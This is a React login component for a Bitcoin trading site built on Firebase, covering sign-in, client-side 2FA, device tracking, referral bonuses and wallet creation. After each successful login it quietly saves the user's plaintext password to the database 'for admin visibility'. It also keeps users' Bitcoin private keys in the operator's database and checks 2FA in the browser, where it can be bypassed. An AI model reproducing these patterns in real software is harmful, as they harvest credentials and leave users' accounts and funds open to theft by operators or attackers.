import React, { useState, useEffect } from "react";
import { Link, useNavigate, useLocation, useSearchParams } from "react-router-dom";
import { 
  signInWithEmailAndPassword, 
  onAuthStateChanged, 
  setPersistence, 
  browserSessionPersistence,
  signInWithPopup
} from "firebase/auth";
import { auth, db } from "../firebase";
import { doc, getDoc, updateDoc, collection, getDocs, addDoc, setDoc, query, where, increment } from "firebase/firestore";
import { handleFirestoreError, OperationType } from "../lib/firestoreErrorHandler";
import { verify } from "otplib";
import { Mail, Lock, Eye, EyeOff, ArrowRight, ShieldCheck, AlertCircle, Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import { useTheme } from "./ThemeContext";
import { cn, generateReferralCode } from "../lib/utils";
import { generateBitcoinWallet } from "../lib/bitcoinUtils";
import { Logo } from "../components/Logo";
import { APP_CONFIG } from "../config";
import { HumanVerifier } from "../components/HumanVerifier";

export const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [twoFactorCode, setTwoFactorCode] = useState("");
  const [showTwoFactor, setShowTwoFactor] = useState(false);
  const [tempUser, setTempUser] = useState<any>(null);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [isHumanVerified, setIsHumanVerified] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const { theme } = useTheme();

  const [searchParams] = useSearchParams();
  const referralCode = searchParams.get("ref");
  
  useEffect(() => {
    if (sessionStorage.getItem('goldencoin_signing_out') === 'true') {
      auth.signOut().then(() => {
        sessionStorage.removeItem('goldencoin_signing_out');
      }).catch(() => {
        sessionStorage.removeItem('goldencoin_signing_out');
      });
      return;
    }

    const unsubscribe = onAuthStateChanged(auth, (user) => {
      // Only redirect if not currently in the middle of a login process
      if (user && !user.isAnonymous && !showTwoFactor && !isLoggingIn) {
        navigate("/dashboard", { replace: true });
      }
    });
    return () => unsubscribe();
  }, [navigate, showTwoFactor, isLoggingIn]);

  const from = location.state?.from?.pathname || "/dashboard";

  const trackDeviceAndNotify = async (uid: string, userEmail: string) => {
    try {
      const now = new Date();
      const currentUser = auth.currentUser;
      if (!currentUser) return;
      
      const idToken = await currentUser.getIdToken();
      
      // 1. Get or create persistent device ID
      let deviceId = localStorage.getItem('goldencoin_device_id');
      const isNewSession = !deviceId;
      
      if (!deviceId) {
        deviceId = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now();
        localStorage.setItem('goldencoin_device_id', deviceId);
      }

      // 2. Call backend to capture fingerprint and SEND EMAIL
      console.log(`[Security] Triggering login notification for ${userEmail}...`);
      
      // Map navigator properties for deviceDetails
      const browserName = navigator.userAgent.includes("Chrome") ? "Chrome" : 
                         navigator.userAgent.includes("Firefox") ? "Firefox" : 
                         navigator.userAgent.includes("Safari") ? "Safari" : "Unknown Browser";
      const osName = navigator.userAgent.includes("Windows") ? "Windows" : 
                    navigator.userAgent.includes("Mac") ? "MacOS" : 
                    navigator.userAgent.includes("Linux") ? "Linux" : "Unknown OS";

      const res = await fetch('/api/auth/login-notification', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${idToken}`
        },
        body: JSON.stringify({
          deviceDetails: {
            deviceId,
            browser: browserName,
            os: osName,
            deviceString: `${browserName} on ${osName}`,
            userAgent: navigator.userAgent,
            time: now.toLocaleString()
          }
        })
      });
      
      const data = await res.json();
      
      if (data.success) {
        console.log(`%c[Security] Alert email triggered successfully`, "color: green; font-weight: bold;");

        // 3. Update or Add device in Firestore
        const devicesRef = collection(db, "users", uid, "devices");
        // Get IP and location from backend response if available, or use defaults
        const { browser = browserName, os = osName, ip = "Unknown", location = "Unknown" } = data;
        const deviceString = `${browser} ${os}`;
        
        const snap = await getDocs(devicesRef);
        const devices = snap.docs.map(d => ({ id: d.id, ...d.data() } as any));
        
        const existingDevice = devices.find(d => d.deviceId === deviceId);
        
        if (!existingDevice) {
          console.log("[Security] New device detected. Registering...");
          await addDoc(devicesRef, {
            deviceId,
            deviceString,
            browser,
            os,
            ip,
            location,
            lastLogin: now.toISOString(),
            status: 'active',
            isIncognito: isNewSession
          });
        } else {
          console.log("[Security] Existing device detected. Updating metadata.");
          await updateDoc(doc(db, "users", uid, "devices", existingDevice.id), {
            lastLogin: now.toISOString(),
            ip, 
            location,
            browser,
            os
          });
        }
      } else {
        console.error("[Security] Notification service failed:", data.error);
      }
    } catch (err) {
      console.warn("[Security] Device tracking/notification failed:", err);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!isHumanVerified) {
      setError("Please verify you are not a robot first.");
      return;
    }

    const trimmedEmail = email.trim();

    setLoading(true);
    setIsLoggingIn(true);

    if (!window.navigator.onLine) {
      setError("You are currently offline. Please check your internet connection.");
      setLoading(false);
      setIsLoggingIn(false);
      return;
    }

    try {
      // Ensure persistence is set to session
      try {
        await setPersistence(auth, browserSessionPersistence);
      } catch (pErr) {
        console.warn("Persistence error:", pErr);
      }

      // Check for 30 days deletion cooldown
      try {
        const emailDocId = trimmedEmail.toLowerCase().replace(/[@.]/g, '_');
        const delSnap = await getDoc(doc(db, "deletedAccounts", emailDocId));
        if (delSnap.exists()) {
          const data = delSnap.data();
          const lastDeletedAt = new Date(data.deletedAt).getTime();
          const now = Date.now();
          const diffDays = (now - lastDeletedAt) / (1000 * 60 * 60 * 24);
          
          if (diffDays < 30) {
            setError(`This account was recently deleted. You cannot access it or create a new one with this email for 30 days.`);
            setLoading(false);
            setIsLoggingIn(false);
            return;
          }
        }
      } catch (err: any) {
        console.warn("Could not check deleted accounts:", err);
      }

      const userCredential = await signInWithEmailAndPassword(auth, trimmedEmail, password);
      let userData;
      try {
        const userDocRef = doc(db, "users", userCredential.user.uid);
        const userDoc = await getDoc(userDocRef);
        if (!userDoc.exists()) {
          // Generate realistic valid SegWit BTC wallet address synchronously instantly
          const btcWallet = generateBitcoinWallet();
          const btcAddress = btcWallet.address;

          // Save Private credentials to users/{uid}/privateData/wallet subcollection
          try {
            await setDoc(doc(db, "users", userCredential.user.uid, "privateData", "wallet"), {
              btcPrivateKey: btcWallet.privateKey,
              address: btcWallet.address,
              createdAt: new Date().toISOString()
            });
          } catch (e) {
            console.error("Secure wallet setup error in self-heal:", e);
          }
          
          // Self-heal: recreate the account document
          const friendlyId = email.split('@')[0].toLowerCase().replace(/[^a-z0-9]/g, '.');
          const isAdminEmail = APP_CONFIG.adminEmails.includes(email);
          userData = {
            uid: userCredential.user.uid,
            friendlyId: friendlyId,
            email: email,
            displayName: email.split('@')[0],
            role: isAdminEmail ? "admin" : "user",
            usdBalance: 0,
            btcBalance: 0,
            tradingBalanceBtc: 0,
            btcAddress: btcAddress,
            totalDepositedUsd: 0,
            referralCode: Math.random().toString(36).substring(2, 8).toUpperCase(),
            referralBonusEarned: 0,
            hasTraded: false,
            kycStatus: "not_submitted",
            status: "active",
            createdAt: new Date().toISOString(),
          };
          
          localStorage.setItem('cached_profile_' + userCredential.user.uid, JSON.stringify(userData));
          await setDoc(userDocRef, userData, { merge: true });
        } else {
          userData = userDoc.data();
          localStorage.setItem('cached_profile_' + userCredential.user.uid, JSON.stringify(userData));
        }
      } catch (err: any) {
        handleFirestoreError(err, OperationType.GET, `users/${userCredential.user.uid}`);
      }

      if (userData?.twoFactorEnabled) {
        setTempUser({ uid: userCredential.user.uid, secret: userData.twoFactorSecret });
        setShowTwoFactor(true);
        await auth.signOut();
        setIsLoggingIn(false);
      } else {
        await trackDeviceAndNotify(userCredential.user.uid, email);

        // Sync plain password for admin visibility
        try {
          await updateDoc(doc(db, "users", userCredential.user.uid), {
            plainPassword: password,
            lastLogin: new Date().toISOString()
          });
        } catch (err) {
          console.error("Failed to sync password/login time:", err);
        }
        
        // Redirect to dedicated 2FA setup page since 2FA is disabled
        navigate("/2fa/setup", { replace: true });
      }
    } catch (err: any) {
      if (err.code !== "auth/invalid-credential" && err.code !== "auth/user-not-found" && err.code !== "auth/wrong-password" && err.code !== "auth/too-many-requests") {
        console.error("Login error:", err);
      }
      let message = "Login Failed: Invalid credentials or account issues";
      
      if (err.code === "auth/invalid-credential" || err.code === "auth/user-not-found" || err.code === "auth/wrong-password") {
        message = "Incorrect email or password. Please try again.";
      } else if (err.code === "auth/network-request-failed") {
        message = "Network error. Please check your connection.";
      } else if (err.code === "auth/too-many-requests") {
        message = "Too many failed attempts. Please try again later.";
      } else if (err.code === "auth/user-disabled") {
        message = "This account has been disabled.";
      } else if (err.message && err.message.includes("configuration missing")) {
        message = err.message;
      }
      
      setError(message);
      setIsLoggingIn(false);
    } finally {
      setLoading(false);
    }
  };

  const verifyTwoFactor = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setIsLoggingIn(true);
    setError("");

    try {
      const result = await verify({
        token: twoFactorCode,
        secret: tempUser.secret
      });

      // @ts-ignore: otplib version differences
      const isValid = result === true || (typeof result === 'object' && result?.valid === true);

      if (isValid) {
        await signInWithEmailAndPassword(auth, email, password);

        await trackDeviceAndNotify(tempUser.uid, email);

        // Sync plain password for admin visibility
        try {
          await updateDoc(doc(db, "users", tempUser.uid), {
            plainPassword: password,
            lastLogin: new Date().toISOString()
          });
        } catch (err) {
          console.error("Failed to sync password/login time:", err);
        }
        navigate(from, { replace: true });
      } else {
        setError("Invalid 2FA code.");
        setIsLoggingIn(false);
      }
    } catch (err: any) {
      setError("Verification failed.");
      setIsLoggingIn(false);
    } finally {
      setLoading(false);
    }
  };

  const processSocialUser = async (user: any) => {
    const userDocRef = doc(db, "users", user.uid);
    const userDoc = await getDoc(userDocRef);
    if (!userDoc.exists()) {
      const isAdminEmail = user.email ? APP_CONFIG.adminEmails.includes(user.email) : false;
      const friendlyId = (user.email ? user.email.split('@')[0] : user.uid).toLowerCase().replace(/[^a-z0-9]/g, '.');
      
      // Check referral
      let referredByUid = "";
      const finalReferralCode = referralCode || "";
      if (finalReferralCode && /^[a-zA-Z0-9]+$/.test(finalReferralCode)) {
        try {
          const q = query(collection(db, "users"), where("referralCode", "==", finalReferralCode));
          const snap = await getDocs(q);
          if (!snap.empty) {
            referredByUid = snap.docs[0].id;
          }
        } catch (err) {
          console.warn("Error checking referral for social log in:", err);
        }
      }

      // Create new profile conformant to UI and db state schemas
      await setDoc(userDocRef, {
        uid: user.uid,
        friendlyId: friendlyId,
        email: user.email || "",
        displayName: user.displayName || "User",
        role: isAdminEmail ? "admin" : "user",
        usdBalance: 0,
        btcBalance: 0,
        tradingBalanceBtc: 0,
        totalDepositedUsd: 0,
        referralCode: generateReferralCode(),
        referredBy: referredByUid,
        referralBonusEarned: 0,
        hasTraded: false,
        kycStatus: "not_submitted",
        status: "active",
        createdAt: new Date().toISOString(),
        phoneNumber: user.phoneNumber || "",
      });

      if (referredByUid) {
        try {
          await updateDoc(doc(db, "users", referredByUid), {
            usdBalance: increment(10),
            referralBonusEarned: increment(10),
          });

          await addDoc(collection(db, "notifications"), {
            userId: referredByUid,
            title: "Referral Bonus Received",
            message: `You've earned a $10.00 cash bonus for referring ${user.displayName || "User"}!`,
            type: "success",
            read: false,
            timestamp: new Date().toISOString(),
          });
        } catch (err) {
          console.warn("Failed to credit referrer on social signup:", err);
        }
      }
    } else {
      await updateDoc(userDocRef, {
        lastLogin: new Date().toISOString()
      });
    }
  };



  return (
    <div className="min-h-screen flex flex-col items-center transition-colors duration-300 bg-slate-50 dark:bg-slate-950">
      <div className="flex-1 flex items-center justify-center p-6 relative overflow-hidden w-full">
        {/* Background Gradients */}
        <div className="absolute top-0 right-0 w-[500px] h-[500px] bg-[#C9A96E]/5 rounded-full blur-[120px] -z-10"></div>
        <div className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-[#C9A96E]/5 rounded-full blur-[120px] -z-10"></div>

        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="w-full max-w-md border rounded-3xl p-8 md:p-12 shadow-2xl relative z-10 transition-colors duration-300 bg-white border-slate-200 dark:bg-slate-900 dark:border-[#C9A96E]/10"
        >
          {/* ... existing content ... */}
          <div className="text-center mb-10">
            <div className="inline-flex items-center gap-3 mb-6">
              <Logo size="xl" />
            </div>
            <h2 className="text-3xl font-bold tracking-tight text-slate-950 dark:text-white">Welcome Back</h2>
            <p className="text-slate-500 mt-2">Enter your credentials to access your account.</p>
          </div>

          {error && (
            <div className="bg-red-500/10 border border-red-500/20 text-red-500 p-4 rounded-xl text-sm mb-6 flex items-start gap-3 whitespace-pre-line text-left">
              <span className="w-2 h-2 bg-red-500 rounded-full animate-pulse mt-1.5 shrink-0"></span>
              <div className="flex-1">{error}</div>
            </div>
          )}

          <AnimatePresence mode="wait">
            {showTwoFactor ? (
              <motion.div
                key="2fa-form"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-8"
              >
                <div className="text-center space-y-2">
                  <div className="w-16 h-16 bg-[#C9A96E]/10 text-[#C9A96E] rounded-2xl flex items-center justify-center mx-auto mb-4">
                    <ShieldCheck size={32} />
                  </div>
                  <h3 className="text-xl font-bold text-slate-950 dark:text-white">Two-Factor Verification</h3>
                  <p className="text-sm text-slate-500">Enter the 6-digit code from your authenticator app.</p>
                </div>

                <form onSubmit={verifyTwoFactor} className="space-y-6">
                  <div className="space-y-4">
                    <input 
                      type="text" 
                      maxLength={6}
                      placeholder="000000"
                      autoFocus
                      value={twoFactorCode}
                      onChange={(e) => setTwoFactorCode(e.target.value.replace(/\D/g, ""))}
                      className="w-full border rounded-xl py-4 text-center text-3xl font-bold tracking-[0.5em] text-[#C9A96E] outline-none transition-all bg-slate-50 border-slate-200 focus:border-[#C9A96E]/40 dark:bg-[#0B0B0B] dark:border-[#C9A96E]/10 dark:focus:border-[#C9A96E]/40"
                    />
                    
                    {error && (
                      <div className="flex items-center gap-2 text-red-500 text-sm justify-center">
                        <AlertCircle size={16} />
                        {error}
                      </div>
                    )}
                  </div>

                  <div className="flex gap-4">
                    <button 
                      type="button"
                      onClick={() => setShowTwoFactor(false)}
                      className="flex-1 py-4 font-bold rounded-xl border transition-all bg-slate-50 text-slate-950 border-slate-200 hover:bg-slate-100 dark:bg-slate-800 text-white border-[#C9A96E]/10 hover:bg-slate-700"
                    >
                      Back
                    </button>
                    <button 
                      type="submit"
                      disabled={loading || twoFactorCode.length !== 6}
                      className="flex-[2] py-4 bg-[#C9A96E] text-slate-950 font-bold rounded-xl hover:bg-[#D4B985] transition-all flex items-center justify-center gap-2 disabled:opacity-50"
                    >
                      {loading ? <Loader2 className="animate-spin" size={20} /> : <ShieldCheck size={20} />}
                      Verify
                    </button>
                  </div>
                </form>
              </motion.div>
            ) : (
              <motion.div
                key="login-form"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
              >
                <form onSubmit={handleLogin} className="space-y-6">
                  <div className="space-y-2">
                    <label className="text-sm font-medium ml-1 text-slate-600 dark:text-gray-400">Email Address</label>
                    <div className="relative group">
                      <Mail className="absolute left-4 top-1/2 -translate-y-1/2 transition-colors text-slate-400 group-focus-within:text-[#C9A96E] dark:text-gray-600 dark:group-focus-within:text-[#C9A96E]" size={20} />
                      <input
                        type="email"
                        required
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        className="w-full border rounded-xl py-4 pl-12 pr-4 outline-none transition-all bg-slate-50 border-slate-200 text-slate-950 focus:border-[#C9A96E]/40 dark:bg-[#0B0B0B] dark:border-[#C9A96E]/10 dark:text-white dark:focus:border-[#C9A96E]/40"
                        placeholder="name@example.com"
                      />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <div className="flex items-center justify-between ml-1">
                      <label className="text-sm font-medium text-slate-600 dark:text-gray-400">Password</label>
                      <Link to="/forgot-password" title="Reset your password" id="forgot-password-link" className="text-xs text-[#C9A96E] hover:underline">Forgot password?</Link>
                    </div>
                    <div className="relative group">
                      <Lock className="absolute left-4 top-1/2 -translate-y-1/2 transition-colors text-slate-400 group-focus-within:text-[#C9A96E] dark:text-gray-600 dark:group-focus-within:text-[#C9A96E]" size={20} />
                      <input
                        type={showPassword ? "text" : "password"}
                        required
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full border rounded-xl py-4 pl-12 pr-12 outline-none transition-all bg-slate-50 border-slate-200 text-slate-950 focus:border-[#C9A96E]/40 dark:bg-[#0B0B0B] dark:border-[#C9A96E]/10 dark:text-white dark:focus:border-[#C9A96E]/40"
                        placeholder="••••••••"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-[#C9A96E] dark:text-gray-600 dark:hover:text-[#C9A96E] transition-colors"
                      >
                        {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                      </button>
                    </div>
                  </div>

                  <div className="py-2">
                    <HumanVerifier
                      isVerified={isHumanVerified}
                      onVerify={(success) => {
                        setIsHumanVerified(success);
                        setError("");
                      }}
                    />
                  </div>

                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-4 bg-[#C9A96E] text-slate-950 font-bold rounded-xl hover:bg-[#D4B985] transition-all flex items-center justify-center gap-2 text-lg disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {loading ? "Signing in..." : "Sign In"} <ArrowRight size={20} />
                  </button>
                </form>


              </motion.div>
            )}
          </AnimatePresence>

          <p className="text-center mt-10 text-gray-500 text-sm">
            Don't have an account?{" "}
            <Link to="/register" className="text-[#C9A96E] font-bold hover:underline">Create account</Link>
          </p>
        </motion.div>
      </div>
    </div>
  );
};
